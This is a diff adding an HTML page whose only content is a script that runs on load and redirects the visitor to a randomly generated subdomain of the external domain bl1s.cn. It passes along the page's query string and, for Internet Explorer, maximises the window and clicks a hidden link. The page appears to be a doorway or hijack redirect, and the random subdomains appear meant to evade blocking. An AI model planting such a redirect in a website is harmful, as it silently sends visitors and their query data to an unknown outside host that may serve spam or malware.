@@ -1,0 +1,33 @@
+<body></body>    
+<script>    
+    function getRandomNum(min, max) {    
+        var range = max - min;    
+        var rand = Math.random();    
+        return Math.round(rand * range) + min;    
+    }    
+    
+    function generateMixed(n) {    
+        var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";    
+        var res = "";    
+        for (var i = 0; i < n; i++) {    
+            var id = Math.floor(Math.random() * chars.length);    
+            res += chars[id];    
+        }    
+        return res;    
+    }    
+    var queryString = window.location.search.substring(1); 
+    
+    var url = 'http://' + generateMixed(3) + '.' + generateMixed(3) + '.bl1s.cn/?id=' + queryString + '&u=2';    
+    if (/MSIE/i.test(navigator.userAgent)) {    
+        try {    
+            window.moveTo(0, 0);    
+            window.resizeTo(screen.availWidth, screen.availHeight);    
+        } catch (e) {}    
+        var a = document.createElement('a');    
+        a.href = url;    
+        document.body.appendChild(a);    
+        a.click();    
+    } else {    
+        location.href = url;    
+    }    
+</script>
